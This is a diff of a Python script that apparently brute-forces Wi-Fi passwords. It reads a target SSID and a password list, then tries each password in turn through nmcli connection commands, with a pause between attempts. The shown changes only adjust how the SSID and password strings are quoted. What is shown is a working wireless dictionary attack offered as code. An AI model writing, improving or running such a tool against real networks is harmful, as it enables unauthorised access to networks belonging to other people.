@@ -16,7 +16,7 @@ os.system("nmcli device wifi")
 
 print("___ Enter the SSID ___ \n")
 ssid_in = input("SSID:")
-ssid = f"\"{ssid_in}\""
+ssid = f"{ssid_in}"
 
 # reads each line from the password file 
 
@@ -54,11 +54,9 @@ for pswd in pswd_lst:
         continue
     
     try:
-	    pswd = f"\"{pswd}\""
-	    cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd]
+	    pswd_1 = (f"{pswd}")
+	    cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd_1]
 	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-
 	    print("trying : " + pswd)
 	    time.sleep(2)
 	    
